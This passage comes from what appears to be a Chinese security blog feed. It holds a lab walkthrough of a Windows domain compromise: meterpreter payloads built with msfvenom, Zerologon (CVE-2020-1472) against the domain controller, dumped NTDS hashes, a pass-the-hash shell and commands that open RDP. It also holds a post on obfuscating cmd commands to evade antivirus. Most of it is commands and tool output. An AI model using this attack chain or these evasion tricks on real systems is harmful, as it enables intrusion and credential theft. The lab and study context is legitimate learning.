<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]</span><br><span class="line">â””â”€$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.20.98 lport=4444 -f exe &gt; sl.exe   </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.20.98:5555 via the meterpreter on session 2</span><br><span class="line">                                       </span><br></pre></td></tr></table></figure>

<p>ç„¶åå¡ä½äº†</p>
<br>

<h5 id="ä½¿ç”¨æ­£å‘é©¬-æˆåŠŸä¸Šçº¿"><a href="#ä½¿ç”¨æ­£å‘é©¬-æˆåŠŸä¸Šçº¿" class="headerlink" title="ä½¿ç”¨æ­£å‘é©¬ æˆåŠŸä¸Šçº¿"></a>ä½¿ç”¨æ­£å‘é©¬ æˆåŠŸä¸Šçº¿</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]</span><br><span class="line">â””â”€$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -f exe &gt; 6666.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 496 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set rhost 10.0.20.99</span><br><span class="line">rhost =&gt; 10.0.20.99</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started bind TCP handler against 10.0.20.99:6666</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.0.20.99</span><br><span class="line">[*] Meterpreter session 3 opened (10.0.20.98:53533 -&gt; 10.0.20.99:6666) at 2022-03-22 05:46:01 -0400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN2016</span><br><span class="line">OS              : Windows 2016+ (10.0 Build 14393).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : VULNTARGET</span><br><span class="line">Logged On Users : 4</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.10.110      00:0c:29:be:1e:f6  12</span><br><span class="line">    10.0.10.255      ff:ff:ff:ff:ff:ff  12</span><br><span class="line">    10.0.20.98       00:0c:29:f6:6a:0f  9</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  9</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  9</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  12</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  9</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  12</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  9</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å·²ç»å¾—åˆ°åŸŸå†…ipæ®µä¸º <code>10.0.10.0/24</code></p>
<p>ç„¶åå®šä½åŸŸæ§</p>
<p><code>run post/windows/gather/enum_domain</code></p>
<p>å¾—åˆ°åŸŸæ§ä¸ºDCå <code>win2019</code>  IP<code>10.0.10.110</code> åŸŸå <code>vulntarget</code></p>
<p><img src="/posts/3edb83f3/17.png" alt="æˆªå›¾"></p>
<br>

<p>å†æ·»åŠ ä¸€ä¸ªwin2016çš„è·¯ç”±</p>
<p><code>meterpreter &gt; run post/multi/manage/autoroute </code></p>
<p><img src="/posts/3edb83f3/18.png" alt="æˆªå›¾"></p>
<br>

<h3 id="åŸŸæ§win2016"><a href="#åŸŸæ§win2016" class="headerlink" title="åŸŸæ§win2016"></a>åŸŸæ§win2016</h3><h4 id="ç«¯å£æ‰«æ-1"><a href="#ç«¯å£æ‰«æ-1" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p>è¿™é‡Œä¸ºäº†èŠ‚çœæ—¶é—´å°±æ‰«å‡ ä¸ªç«¯å£äº† ä¸ç„¶å¤ªæ…¢äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]</span><br><span class="line">â””â”€$ proxychains nmap -Pn -sT 10.0.10.110 -p6379,80,8080,445,139    148 â¨¯ 1 âš™</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-22 06:19 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:8080 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:139  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:80 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:6379 &lt;--socket error or timeout!</span><br><span class="line">Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 100.00% done; ETC: 06:20 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.0.10.110</span><br><span class="line">Host is up (12s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">80/tcp   closed http</span><br><span class="line">139/tcp  open   netbios-ssn</span><br><span class="line">445/tcp  open   microsoft-ds</span><br><span class="line">6379/tcp closed redis</span><br><span class="line">8080/tcp closed http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 45.54 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="CVE-2020-1472ï¼ˆç½®ç©ºå¯†ç "><a href="#CVE-2020-1472ï¼ˆç½®ç©ºå¯†ç " class="headerlink" title="CVE-2020-1472ï¼ˆç½®ç©ºå¯†ç )"></a>CVE-2020-1472ï¼ˆç½®ç©ºå¯†ç )</h4><p>æ²¡å•¥å¯ä»¥äº†åˆ©ç”¨çš„åœ°æ–¹ï¼Œç„¶åçœ‹äº†ä¸‹ å…¶ä»–å¸ˆå‚…çš„æ–‡ç« </p>
<p>è¿™é‡Œç”¨åˆ°äº† åŸŸå†…ææƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]</span><br><span class="line">â””â”€$ proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110     1 â¨¯</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Performing authentication attempts...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">===========================================================</span><br><span class="line">Target vulnerable, changing account password to empty string</span><br><span class="line"></span><br><span class="line">Result: 0</span><br><span class="line"></span><br><span class="line">Exploit complete!</span><br><span class="line">                                                                             </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]</span><br><span class="line">â””â”€$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯†ç è¢«ç½®ç©ºäº†</p>
<h4 id="ä½¿ç”¨impactet"><a href="#ä½¿ç”¨impactet" class="headerlink" title="ä½¿ç”¨impactet"></a>ä½¿ç”¨impactet</h4><p>ä½¿ç”¨ <code>secretsdump.py</code> dump hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/impacket/impacket-0.9.24/examples]</span><br><span class="line">â””â”€$ proxychains python3 secretsdump.py  vulntarget.com/WIN2019\$@10.0.10.110  -just-dc  -no-pass  </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3dd8e4a352b346f110b587e1d1d1936:::</span><br><span class="line">vulntarget.com\win2016:1601:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::</span><br><span class="line">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WIN2016$:1602:aad3b435b51404eeaad3b435b51404ee:f835118efec7ef06133c3f228e69e554:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:70a1edb09dbb1b58f1644d43fa0b40623c014b690da2099f0fc3a8657f75a51d</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:04c435638a00755c0b8f12211d3e88a1</span><br><span class="line">Administrator:des-cbc-md5:dcc29476a789ec9e</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:f7a968745d4f201cbeb73f4b1ba588155cfd84ded34aaf24074a0cfe95067311</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:f401ac35dc1c6fa19b0780312408cded</span><br><span class="line">krbtgt:des-cbc-md5:10efae67c7026dbf</span><br><span class="line">vulntarget.com\win2016:aes256-cts-hmac-sha1-96:e4306bef342cd8215411f9fc38a063f5801c6ea588cc2fee531342928b882d61</span><br><span class="line">vulntarget.com\win2016:aes128-cts-hmac-sha1-96:6da7e9e046c4c61c3627a3276f5be855</span><br><span class="line">vulntarget.com\win2016:des-cbc-md5:6e2901311c32ae58</span><br><span class="line">WIN2019$:aes256-cts-hmac-sha1-96:092c877c3b20956347d535d91093bc1eb16b486b630ae2d99c0cf15da5db1390</span><br><span class="line">WIN2019$:aes128-cts-hmac-sha1-96:0dca147d2a216089c185d337cf643e25</span><br><span class="line">WIN2019$:des-cbc-md5:01c8894f541023bc</span><br><span class="line">WIN2016$:aes256-cts-hmac-sha1-96:f53f26ac32375f204b39a10dbe054714ac57f4ed1604e522db5b2ab51d719760</span><br><span class="line">WIN2016$:aes128-cts-hmac-sha1-96:1deb3de2d7567fd69e91c14c3dff8ce7</span><br><span class="line">WIN2016$:des-cbc-md5:c44cbff1e3153e85</span><br><span class="line">[*] Cleaning up... </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°administratorçš„hashå€¼ <code>aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</code> </p>
<p>ä½¿ç”¨ smbexec é€šè¿‡administratorçš„hashè¿æ¥cmd æ‹¿åˆ°åŸŸæ§çš„cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/impacket/impacket-0.9.24/examples]</span><br><span class="line">â””â”€$ proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110  </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p><img src="/posts/3edb83f3/19.png" alt="æˆªå›¾"></p>
<br>

<p>ç ´è§£hash å»å¾—åˆ°åŸŸæ§çš„ç™»å½•å¯†ç </p>
<p>å¾—åˆ°å¯†ç ä¸º Admin@666</p>
<br>

<h4 id="ç„¶åå¼€å¯3389è¿œç¨‹æ¡Œé¢"><a href="#ç„¶åå¼€å¯3389è¿œç¨‹æ¡Œé¢" class="headerlink" title="ç„¶åå¼€å¯3389è¿œç¨‹æ¡Œé¢"></a>ç„¶åå¼€å¯3389è¿œç¨‹æ¡Œé¢</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/3edb83f3/20.png" alt="æˆªå›¾"></p>
<br>

<p><code>proxychains rdesktop 10.0.10.110</code></p>
<br>

<p><img src="/posts/3edb83f3/21.png" alt="æˆªå›¾"></p>
<p>æ²¡è¿ä¸Šâ€¦  æ ¹æ®æŠ¥é”™æŸ¥äº†ä¸‹è§£å†³æ–¹æ³•ï¼š<br>è¿›å…¥windowsç³»ç»Ÿï¼Œåœ¨â€œè¿œç¨‹æ¡Œé¢â€ä¸­ï¼Œå°†â€œä»…å…è®¸ä½¿ç”¨ç½‘ç»œçº§åˆ«èº«ä»½éªŒè¯çš„è¿œç¨‹æ¡Œé¢çš„è®¡ç®—æœºè¿æ¥ï¼ˆå»ºè®®ï¼‰â€å‹¾é€‰å»é™¤å³å¯ã€‚</p>
<p>è²Œä¼¼åªæœ‰è¿™æ ·æ‰èƒ½ç”¨rdesktopç™»å½•</p>
<p>ç„¶åæ‰¾äº†å¦ä¸€ç§æ–¹æ³• ä¸‹è½½<code>remmina</code> </p>
<p><code>sudo apt install remmina</code></p>
<p><img src="/posts/3edb83f3/22.png" alt="æˆªå›¾"></p>
<p>ç„¶åæˆåŠŸç™»å½•åˆ°åŸŸæ§çš„è¿œç¨‹æ¡Œé¢</p>
<p><img src="/posts/3edb83f3/23.png" alt="æˆªå›¾"></p>
<br>

<p>è¿™é¶åœºä»å¼€å§‹åˆ°ç°åœ¨ æäº†å¿«ä¸€å¤©äº† å¥½å¤šä¸œè¥¿éƒ½å¿˜è®°æ€ä¹ˆç”¨äº†ï¼Œå½“ç„¶ä¹Ÿå­¦äº†äº›æ–°ä¸œè¥¿ è¿˜æ˜¯æœ‰äº›æ”¶è·çš„ã€‚æ˜å¤©å†å›é¡¾ä¸‹ï¼Œç„¶åå°è¯•ä¸‹koadic </p>
]]></content>
  </entry>
  <entry>
    <title>cmdå‘½ä»¤æ··æ·†</title>
    <url>/posts/bac18dc8/</url>
    <content><![CDATA[<p>ç°åœ¨æ€è½¯å¤§éƒ½æ˜¯åº•å±‚é˜²å¾¡ï¼Œç›´æ¥æ··æ·†cmdæ²¡å•¥ç”¨ï¼Œè¿™é‡Œçš„è¯ä¸»è¦æ˜¯å­¦ä¸€ä¸‹æ€è·¯</p>
<h3 id="CMDå‘½ä»¤ç¬¦å·"><a href="#CMDå‘½ä»¤ç¬¦å·" class="headerlink" title="CMDå‘½ä»¤ç¬¦å·"></a>CMDå‘½ä»¤ç¬¦å·</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@:éšè—å‘½ä»¤çš„å›æ˜¾ã€‚</span><br><span class="line">~:å˜é‡æ‰©å±•æˆ–è€…æ‰©å±•ç¯å¢ƒå˜é‡æŒ‡å®šä½ç½®çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">%:å¼•ç”¨ç¯å¢ƒå˜é‡æˆ–è€…å•ä¸ª%è¡¨ç¤ºå¼•ç”¨å‘½ä»¤è¡Œå‚æ•°ã€‚</span><br><span class="line">^:å–æ¶ˆè½¬ä¹‰å­—ç¬¦ã€‚</span><br><span class="line">&amp;:å‘½ä»¤è¿æ¥å­—ç¬¦ã€‚</span><br><span class="line">ï¼š ç®¡é“ç¬¦ï¼Œå°†ä¸Šä¸€ä¸ªå‘½ä»¤çš„è¾“å‡º,ä½œä¸ºä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚</span><br><span class="line">:ï¼š æ ‡ç­¾ç¬¦,æ¥å—gotoå‘½ä»¤æ‰€æŒ‡å‘çš„æ ‡ç­¾ã€‚</span><br><span class="line">â€â€œ:ç•Œå®šç¬¦,ä½¿ç”¨å¸¦æœ‰ç©ºæ ¼çš„è·¯å¾„æ—¶ç”¨â€â€œå°†è·¯å¾„æ‹¬èµ·æ¥ã€‚</span><br><span class="line">/: å…¶åçš„å­—ç¬¦æ˜¯å‘½ä»¤çš„åŠŸèƒ½å¼€å…³ã€‚</span><br><span class="line">&gt;: å‘½ä»¤é‡å®šå‘ç¬¦ï¼Œè¾“å…¥åœ¨å‰ï¼Œè¾“å‡ºåœ¨åï¼Œè¦†ç›–ä¹‹å‰çš„å†…å®¹ã€‚</span><br><span class="line">&gt;&gt;: å‘½ä»¤é‡å®šå‘ç¬¦ã€‚è¾“å…¥åœ¨å‰ï¼Œè¾“å‡ºåœ¨åï¼Œä¸è¦†ç›–ä¹‹å‰çš„å†…å®¹ã€‚</span><br><span class="line">&lt;:å°†åé¢æ–‡ä»¶çš„å†…å®¹è¾“å‡ºåˆ°å‰é¢ã€‚</span><br><span class="line">= :èµ‹å€¼ç¬¦å·,ç”¨äºå˜é‡èµ‹å€¼ã€‚</span><br><span class="line">\ :å½“å‰è·¯å¾„æ‰€åœ¨çš„æ ¹è·¯å¾„ã€‚</span><br><span class="line">&amp;&amp; :è¿æ¥ä¸¤ä¸ªå‘½ä»¤,&amp;&amp;å‰çš„å‘½ä»¤æˆåŠŸæ—¶,æ‰æ‰§è¡Œ&amp;&amp;åçš„å‘½ä»¤ã€‚</span><br><span class="line"> 	ï¼šè¿æ¥ä¸¤ä¸ªå‘½ä»¤,	 	å‰çš„å‘½ä»¤å¤±è´¥æ—¶,æ‰æ‰§è¡Œ	 	åçš„å‘½ä»¤ã€‚</span><br><span class="line">$:findstrå‘½ä»¤ä¸­è¡¨ç¤ºä¸€è¡Œçš„ç»“æŸã€‚</span><br><span class="line">``:for/fä¸­è¡¨ç¤ºå®ƒä»¬æ‰€åŒ…å«çš„å†…å®¹å½“ä½œå‘½ä»¤è¡Œæ‰§è¡Œå¹¶åˆ†æå®ƒçš„è¾“å‡ºã€‚</span><br><span class="line">!: å»¶è¿Ÿå˜é‡,ä½¿ç”¨!!å°†å˜é‡åæ‰©èµ·æ¥è¡¨ç¤ºå¯¹å˜é‡å€¼çš„å¼•ç”¨ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h3 id="å¤§å°å†™-ç‰¹æ®Šå­—ç¬¦æ··æ·†"><a href="#å¤§å°å†™-ç‰¹æ®Šå­—ç¬¦æ··æ·†" class="headerlink" title="å¤§å°å†™/ç‰¹æ®Šå­—ç¬¦æ··æ·†"></a>å¤§å°å†™/ç‰¹æ®Šå­—ç¬¦æ··æ·†</h3><p>cmdä¸­å¤§å°å†™ä¸æ•æ„Ÿ å¯ä»¥å¤§å°å†™æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/posts/bac18dc8/1.png" alt="æˆªå›¾"></p>
<h3 id="ç‰¹æ®Šå­—ç¬¦æ··æ·†"><a href="#ç‰¹æ®Šå­—ç¬¦æ··æ·†" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦æ··æ·†"></a>ç‰¹æ®Šå­—ç¬¦æ··æ·†</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01 ^"></a>0x01 ^</h4><p><code>^</code>æ˜¯cmdä¸­å¸¸è§çš„è½¬ä¹‰å­—ç¬¦ ä¸ä¼šå½±å“å‘½ä»¤çš„æ­£å¸¸æ‰§è¡Œã€‚</p>
<p><img src="/posts/bac18dc8/2.png" alt="æˆªå›¾"></p>
<h4 id="0x02-â€œâ€æ‹¼æ¥"><a href="#0x02-â€œâ€æ‹¼æ¥" class="headerlink" title="0x02 â€œâ€æ‹¼æ¥"></a>0x02 â€œâ€æ‹¼æ¥</h4><p><img src="/posts/bac18dc8/3.png" alt="æˆªå›¾"></p>
<h4 id="0x03-æ›¿æ¢ç©ºæ ¼"><a href="#0x03-æ›¿æ¢ç©ºæ ¼" class="headerlink" title="0x03  , ;æ›¿æ¢ç©ºæ ¼"></a>0x03  , ;æ›¿æ¢ç©ºæ ¼</h4><p><img src="/posts/bac18dc8/4.png" alt="æˆªå›¾"></p>
<p>ä½†æ˜¯è¿™ä¸ªæ’å…¥<code>net user</code>ä¸ä¼šæˆåŠŸ</p>
<h4 id="0x04-ï¼ˆï¼‰"><a href="#0x04-ï¼ˆï¼‰" class="headerlink" title="0x04 ï¼ˆï¼‰"></a>0x04 ï¼ˆï¼‰</h4><p><img src="/posts/bac18dc8/5.png" alt="æˆªå›¾"></p>
<br>

<br>

<h3 id="åˆ©ç”¨ç¯å¢ƒå˜é‡æ··æ·†"><a href="#åˆ©ç”¨ç¯å¢ƒå˜é‡æ··æ·†" class="headerlink" title="åˆ©ç”¨ç¯å¢ƒå˜é‡æ··æ·†"></a>åˆ©ç”¨ç¯å¢ƒå˜é‡æ··æ·†</h3><h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><p>åœ¨cmdä¸‹ä½¿ç”¨<code>set</code> å¯ä»¥åˆ—ä¸¾å‡ºcmdä¸­çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ ä¸€èˆ¬ä½¿ç”¨<code>set a=who</code>è¿™ç§çš„éƒ½æ˜¯ä¸´æ—¶å˜é‡ é‡å¯åä¾¿ä¸ä¼šå­˜åœ¨  ä¸€èˆ¬ä½¿ç”¨callå‘½ä»¤æ¥è°ƒç”¨æ‹“å±•å˜é‡</p>
<p><img src="/posts/bac18dc8/6.png" alt="æˆªå›¾"></p>
<p>ï¼ˆ<code>cmd /c &quot;string&quot; è¡¨ç¤ºæ‰§è¡Œå­—ç¬¦ä¸²stringæ‰§è¡Œçš„å‘½ä»¤ ç„¶åç»ˆæ­¢</code>  å¯ä»¥é€šè¿‡ <code>cmd /?</code> æŸ¥çœ‹cmdä¸‹çš„è¯¦ç»†å‘½ä»¤ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\TEST&gt;cmd /c &quot;set var1=ser&amp;&amp;set var2=ne&amp;&amp;set var3=t u&amp;&amp;call  %var2%%var3</span><br><span class="line">%%var1%&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/7.png" alt="æˆªå›¾"></p>
<br>

<h5 id="è®°ä¸€ä¸ªå°å‘"><a href="#è®°ä¸€ä¸ªå°å‘" class="headerlink" title="è®°ä¸€ä¸ªå°å‘"></a>è®°ä¸€ä¸ªå°å‘</h5><p>è®°ä¸€ä¸ªå°å‘<br><code>set t=&quot;am&quot; &amp;&amp; who%t%i  </code> å¤šæ¬¡æ‰§è¡ŒåªæˆåŠŸä¸€æ¬¡ ä¸çŸ¥é“ä¸ºä»€ä¹ˆ..åç»­å†è¿è¡Œ å‘½ä»¤éƒ½å¤±è´¥äº†<br>ç›´æ¥<code>echo %t%</code>  å¾—åˆ°ä¸º <code>&quot;am&quot;</code><br><img src="/posts/bac18dc8/8.png" alt="æˆªå›¾"></p>
<p>å°è¯•äº†ä¸‹ å‘ç°è¿™é‡Œå¯ä»¥ä¸ç”¨å»åŠ åŒå¼•å·ç©ºæ ¼è¿™ç±»çš„ ä¸ç„¶ä¼šè¢«åˆ†éš”å¼€ ä½†æ˜¯ç¬¬ä¸€æ¬¡èƒ½æ‰§è¡Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸ºå•¥ï¼Œä½†æ˜¯åé¢ä½¿ç”¨<code>call</code> ä¾¿å¯ä»¥æ‰§è¡Œç¯å¢ƒå˜é‡çš„å‘½ä»¤</p>
<h4 id="0x02-cmd-V-ON-å¯ç”¨å»¶è¿Ÿç¯å¢ƒå˜é‡æ‹“å±•"><a href="#0x02-cmd-V-ON-å¯ç”¨å»¶è¿Ÿç¯å¢ƒå˜é‡æ‹“å±•" class="headerlink" title="0x02 cmd /V:ON å¯ç”¨å»¶è¿Ÿç¯å¢ƒå˜é‡æ‹“å±•"></a>0x02 cmd /V:ON å¯ç”¨å»¶è¿Ÿç¯å¢ƒå˜é‡æ‹“å±•</h4><p>å½“å¯ç”¨ <code>/Vï¼šON</code> å ä½¿ç”¨ <code>%var% </code>æˆ– <code>!var! </code>æ¥æ‰©å±•å˜é‡ï¼Œ<code>!var!</code>å¯ä»¥ç”¨æ¥ä»£æ›¿<code>%var%</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd /c &quot;set var1=ser&amp;&amp;set var2=ne&amp;&amp;set var3=t u&amp;&amp;call  %var2%%var3</span><br><span class="line">%%var1%&quot;</span><br><span class="line">cmd /V:ON /c &quot;set var1=ser&amp;&amp;set var2=ne&amp;&amp;set var3=t u&amp;&amp;call  !var2</span><br><span class="line">!!var3!!var1!</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/9.png" alt="æˆªå›¾"></p>
<h4 id="0x03-é€šè¿‡æˆªå–ç¯å¢ƒå˜é‡"><a href="#0x03-é€šè¿‡æˆªå–ç¯å¢ƒå˜é‡" class="headerlink" title="0x03 é€šè¿‡æˆªå–ç¯å¢ƒå˜é‡"></a>0x03 é€šè¿‡æˆªå–ç¯å¢ƒå˜é‡</h4><p>é€šè¿‡<code>set </code> æŸ¥çœ‹å½“å‰çš„ç¯å¢ƒå˜é‡</p>
<p><code>%comspec%</code> å€¼çš„ç»“æœä¸º <code>C:\Windows\system32\cmd.exe</code> </p>
<p>å¯ä»¥é€šè¿‡æˆªå–åé¢éƒ¨åˆ†å»è°ƒç”¨cmd æ ¼å¼ä¸º<code>%VarName:~offset[,length]%</code> ç„¶åå°±å¯ä»¥æ ¹æ®ç¯å¢ƒå˜é‡å»æ‹¼æ¥å‡ºæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤</p>
<p><img src="/posts/bac18dc8/10.png"></p>
<br>

